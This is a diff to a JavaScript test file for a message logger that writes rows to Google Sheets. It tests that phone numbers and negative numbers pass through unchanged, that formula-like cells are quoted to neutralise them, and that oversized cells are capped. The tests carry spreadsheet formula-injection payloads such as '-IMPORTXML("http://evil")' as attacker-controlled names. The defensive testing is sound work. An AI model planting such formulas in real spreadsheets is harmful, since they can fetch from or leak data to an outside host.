@@ -61,15 +61,35 @@ test('sanitizes formula-injection in attacker-controlled cells', () => {
   assert.equal(row[5], '62811@c.us');                       // benign value untouched
 });
 
-test('free-text fields keep a leading + or -; id fields stay fully guarded', () => {
+test('free-text quotes a formula-like leading +/- but preserves a phone/number; id fields stay fully guarded', () => {
   const row = buildRow({
     event: 'message:received', sessionId: 's1', timestamp: T, source: 'Engine',
     data: { id: 'M9', from: '+62811@c.us', to: 'me', chatId: '62811@c.us',
             body: '+62812 call me', type: 'text', fromMe: false, isGroup: false,
-            contact: { pushName: '-Boss' } },
+            contact: { pushName: '-IMPORTXML("http://evil")' } },
   });
-  assert.equal(row[10], '+62812 call me'); // body: '+' NOT quoted (free text)
-  assert.equal(row[7], '-Boss');           // senderName: '-' NOT quoted (free text)
-  assert.equal(row[5], `'+62811@c.us`);    // from: id field, '+' STILL quoted (full guard)
-  assert.equal(row[6], 'me');              // benign id untouched
+  assert.equal(row[10], '+62812 call me');            // body: '+' before a digit = phone number, NOT quoted
+  assert.equal(row[7], `'-IMPORTXML("http://evil")`); // senderName: '-' before a letter = formula, quoted
+  assert.equal(row[5], `'+62811@c.us`);               // from: id field, '+' STILL quoted (full guard)
+  assert.equal(row[6], 'me');                         // benign id untouched
+});
+
+test('free-text keeps a negative number but quotes plus-then-space-then-formula', () => {
+  const row = buildRow({
+    event: 'message:received', sessionId: 's1', timestamp: T, source: 'Engine',
+    data: { id: 'M9', from: 'x', to: 'y', chatId: 'c', type: 'text', fromMe: false, isGroup: false,
+            body: '-5 degrees today', contact: { pushName: '+ IMPORTXML("http://evil")' } },
+  });
+  assert.equal(row[10], '-5 degrees today');            // '-5' is a number → NOT quoted
+  assert.equal(row[7], `'+ IMPORTXML("http://evil")`);  // '+ ' (space after) is not a number → quoted
+});
+
+test('caps an oversized free-text cell to the Google Sheets 50000-char limit', () => {
+  const big = 'a'.repeat(60000);
+  const row = buildRow({
+    event: 'message:received', sessionId: 's1', timestamp: T, source: 'Engine',
+    data: { id: 'M9', from: 'x', to: 'y', chatId: 'c', body: big, type: 'text', fromMe: false, isGroup: false },
+  });
+  // A single over-limit cell would 400 the whole append batch and stall all logging; cap it so it can't.
+  assert.equal(row[10].length, 50000);
 });
